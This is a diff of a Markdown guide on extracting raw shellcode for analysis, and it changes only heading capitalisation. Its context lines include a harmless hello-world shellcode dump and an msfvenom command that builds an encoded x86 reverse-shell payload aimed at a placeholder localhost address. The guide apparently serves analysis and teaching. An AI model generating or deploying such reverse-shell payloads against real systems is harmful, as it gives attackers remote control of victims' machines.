@@ -109,9 +109,9 @@ Diagram saved as 'testing.bin.dot' & 'testing.bin.png'
 asm >
 ```
 
-### Obtaining raw shellcode
+### Obtaining Raw Shellcode
 
-#### Method 1 - Compiling ASM and Dumping Code Section to HEX
+#### Method 1 - Compile ASM and dump code section to hex format
 
 ```
 1. Compile ASM Code
@@ -124,7 +124,7 @@ objdump -d ./helloworld.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 
 echo -e "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" > testing.bin
 ```
 
-#### Method 2 - Using Metasploit's Shellcode Generator
+#### Method 2 - Use Metasploit's shellcode generator
 
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw -b "\x00" -e x86/shikata_ga_nai -o testing.bin
